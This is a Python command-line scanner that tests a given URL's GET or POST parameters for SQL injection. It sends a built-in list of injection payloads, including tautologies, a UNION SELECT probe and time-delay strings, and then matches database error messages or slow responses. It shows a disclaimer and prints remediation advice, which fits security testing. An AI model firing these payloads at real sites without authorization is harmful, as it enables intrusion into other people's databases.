#!/usr/bin/env python3
"""
SQL Injection Tester

This script provides tools to test web applications for SQL injection vulnerabilities.
It includes functions to detect potential vulnerabilities and demonstrate how SQL
injection can be exploited in educational settings.

This tool is intended for educational purposes and authorized penetration testing only.
"""

import argparse
import re
import requests
import urllib.parse
import sys
import time
import logging
from concurrent.futures import ThreadPoolExecutor
from requests.exceptions import RequestException
from scripts.utils.disclaimer import print_disclaimer, require_confirmation

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# SQL injection payloads for testing
BASIC_PAYLOADS = [
    "'",
    "\"",
    "1'",
    "1\"",
    "1' or '1'='1",
    "1\" or \"1\"=\"1",
    "' OR 1=1 --",
    "\" OR 1=1 --",
    "' OR '1'='1' --",
    "' OR 1 --",
    "' OR 'x'='x",
    "' AND 1=0 UNION ALL SELECT 1,2,3,4,5,6,7,8,9 --",
    "1'; WAITFOR DELAY '0:0:5' --",
    "1\"; WAITFOR DELAY '0:0:5' --"
]

# Error patterns that might indicate SQL injection vulnerability
ERROR_PATTERNS = [
    r"SQL syntax.*?MySQL",
    r"Warning.*?mysql_",
    r"MySQLSyntaxErrorException",
    r"valid MySQL result",
    r"check the manual that corresponds to your (MySQL|MariaDB) server version",
    r"ORA-[0-9]{4}",
    r"Oracle error",
    r"SQL syntax.*?Oracle",
    r"Microsoft SQL Server",
    r"ODBC SQL Server Driver",
    r"SQLServer JDBC Driver",
    r"SQLSTATE\[\d+\]",
    r"Warning.*?\Wpg_",
    r"PostgreSQL.*?ERROR",
    r"ERROR:.*?syntax error at or near",
    r"ERROR: parser: parse error at or near",
    r"SQLite/JDBCDriver",
    r"SQLite\.Exception",
    r"System\.Data\.SQLite\.SQLiteException",
    r"Warning.*?sqlite_",
    r"Dynamic SQL Error",
    r"\[SQLITE_ERROR\]"
]

# Compile the error patterns for better performance
COMPILED_ERROR_PATTERNS = [re.compile(pattern, re.IGNORECASE) for pattern in ERROR_PATTERNS]

def check_response_for_errors(response_text):
    """
    Check if the response contains any SQL error messages that might indicate vulnerability.
    
    Parameters:
    -----------
    response_text : str
        The HTTP response text to check
        
    Returns:
    --------
    tuple:
        (bool, str): Whether an error was detected and the error pattern found
    """
    for pattern in COMPILED_ERROR_PATTERNS:
        match = pattern.search(response_text)
        if match:
            return True, match.group(0)
    return False, None

def is_param_vulnerable(url, param, value, method="GET", additional_headers=None, timeout=10):
    """
    Test if a specific parameter is vulnerable to SQL injection.
    
    Parameters:
    -----------
    url : str
        The target URL
    param : str
        The parameter name to test
    value : str
        The original parameter value
    method : str
        HTTP method to use (GET or POST)
    additional_headers : dict
        Additional HTTP headers to include
    timeout : int
        Request timeout in seconds
        
    Returns:
    --------
    dict:
        Result of the vulnerability test including details if vulnerable
    """
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    }
    
    if additional_headers:
        headers.update(additional_headers)
    
    result = {
        'param': param,
        'vulnerable': False,
        'payload': None,
        'error_message': None,
        'response_time_diff': None
    }
    
    for payload in BASIC_PAYLOADS:
        # Replace or append the payload to the parameter value
        modified_value = f"{value}{payload}"
        
        # Prepare request data
        data = {}
        params = {}
        
        if method.upper() == "GET":
            parsed_url = urllib.parse.urlparse(url)
            query_params = dict(urllib.parse.parse_qsl(parsed_url.query))
            query_params[param] = modified_value
            
            # Reconstruct URL without query parameters
            base_url = url.split('?')[0]
            params = query_params
        else:  # POST
            data = {param: modified_value}
        
        try:
            # Measure response time for time-based detection
            start_time = time.time()
            
            if method.upper() == "GET":
                response = requests.get(
                    base_url, 
                    params=params, 
                    headers=headers, 
                    timeout=timeout
                )
            else:  # POST
                response = requests.post(
                    url, 
                    data=data, 
                    headers=headers, 
                    timeout=timeout
                )
            
            end_time = time.time()
            response_time = end_time - start_time
            
            # Check for error-based SQL injection
            has_error, error_message = check_response_for_errors(response.text)
            
            if has_error:
                result['vulnerable'] = True
                result['payload'] = payload
                result['error_message'] = error_message
                return result
            
            # Check for time-based SQL injection (for payloads with WAITFOR DELAY)
            if "WAITFOR DELAY" in payload and response_time > 5:
                result['vulnerable'] = True
                result['payload'] = payload
                result['response_time_diff'] = response_time
                return result
            
        except RequestException as e:
            logger.error(f"Request error for parameter {param} with payload {payload}: {str(e)}")
            continue
    
    return result

def scan_url_for_sql_injection(url, method="GET", additional_headers=None, timeout=10):
    """
    Scan a URL for potential SQL injection vulnerabilities.
    
    Parameters:
    -----------
    url : str
        The target URL to scan
    method : str
        HTTP method to use (GET or POST)
    additional_headers : dict
        Additional HTTP headers to include
    timeout : int
        Request timeout in seconds
        
    Returns:
    --------
    dict:
        Results of the scan with vulnerable parameters
    """
    logger.info(f"Scanning URL for SQL injection: {url}")
    result = {
        'url': url,
        'method': method,
        'vulnerable_params': [],
        'scan_time': None
    }
    
    # Extract parameters
    if method.upper() == "GET":
        parsed_url = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qsl(parsed_url.query)
    else:  # For demonstration, assume a simple form with common parameters
        # In a real scenario, you'd need to extract parameters from the page
        params = [
            ('username', 'test'),
            ('password', 'test'),
            ('search', 'test'),
            ('id', '1')
        ]
    
    if not params:
        logger.warning("No parameters found to test.")
        return result
    
    start_time = time.time()
    
    with ThreadPoolExecutor(max_workers=5) as executor:
        futures = []
        for param_name, param_value in params:
            futures.append(
                executor.submit(
                    is_param_vulnerable, 
                    url, 
                    param_name, 
                    param_value, 
                    method, 
                    additional_headers, 
                    timeout
                )
            )
        
        for future in futures:
            param_result = future.result()
            if param_result['vulnerable']:
                result['vulnerable_params'].append(param_result)
    
    end_time = time.time()
    result['scan_time'] = end_time - start_time
    
    return result

def print_scan_results(results):
    """
    Print the SQL injection scan results in a readable format.
    
    Parameters:
    -----------
    results : dict
        The scan results to print
        
    Returns:
    --------
    None
    """
    print("\n" + "=" * 80)
    print(f"SQL INJECTION SCAN RESULTS FOR: {results['url']}")
    print(f"Method: {results['method']}")
    print(f"Scan Time: {results['scan_time']:.2f} seconds")
    print("=" * 80)
    
    if not results['vulnerable_params']:
        print("\nNo SQL injection vulnerabilities were detected.")
        print("\nNote: This does not guarantee that the application is secure.")
        print("Manual testing and code review are recommended for comprehensive assessment.")
    else:
        print(f"\nVulnerable Parameters Found: {len(results['vulnerable_params'])}")
        
        for i, param in enumerate(results['vulnerable_params'], 1):
            print(f"\n{i}. Parameter: {param['param']}")
            print(f"   Payload: {param['payload']}")
            
            if param['error_message']:
                print(f"   Error: {param['error_message']}")
            
            if param['response_time_diff']:
                print(f"   Time-based detection: Response time {param['response_time_diff']:.2f}s")
    
    print("\n" + "=" * 80)
    print("EDUCATIONAL INFORMATION:")
    print("SQL injection vulnerabilities occur when user input is directly incorporated")
    print("into SQL queries without proper sanitization or parameterization.")
    print("\nRecommended fixes:")
    print("1. Use prepared statements/parameterized queries")
    print("2. Apply input validation and sanitization")
    print("3. Implement proper error handling to avoid exposing database details")
    print("4. Apply the principle of least privilege for database accounts")
    print("=" * 80 + "\n")

def main():
    """Main function to run the SQL injection tester from the command line."""
    parser = argparse.ArgumentParser(
        description="SQL Injection Vulnerability Scanner for Educational Purposes",
        epilog="This tool is for educational and authorized testing only."
    )
    
    parser.add_argument(
        "-u", "--url", 
        required=True,
        help="Target URL to scan (include parameters for GET requests)"
    )
    
    parser.add_argument(
        "-m", "--method",
        choices=["GET", "POST"],
        default="GET",
        help="HTTP method to use (default: GET)"
    )
    
    parser.add_argument(
        "-t", "--timeout",
        type=int,
        default=10,
        help="Request timeout in seconds (default: 10)"
    )
    
    parser.add_argument(
        "--headers",
        nargs="+",
        help="Additional HTTP headers in the format 'key:value'"
    )
    
    args = parser.parse_args()
    
    # Display disclaimer and require confirmation
    print_disclaimer(
        script_name="SQL Injection Tester",
        description="Tests web applications for SQL injection vulnerabilities",
        additional_warning="This tool actively sends potentially malicious payloads to the target."
    )
    
    if not require_confirmation():
        return
    
    # Process headers if provided
    additional_headers = None
    if args.headers:
        additional_headers = {}
        for header in args.headers:
            try:
                key, value = header.split(":", 1)
                additional_headers[key.strip()] = value.strip()
            except ValueError:
                print(f"Warning: Invalid header format: {header}")
    
    try:
        # Perform the scan
        results = scan_url_for_sql_injection(
            args.url,
            method=args.method,
            additional_headers=additional_headers,
            timeout=args.timeout
        )
        
        # Print the results
        print_scan_results(results)
        
    except Exception as e:
        logger.error(f"An error occurred: {str(e)}")
        return 1
    
    return 0

if __name__ == "__main__":
    sys.exit(main())
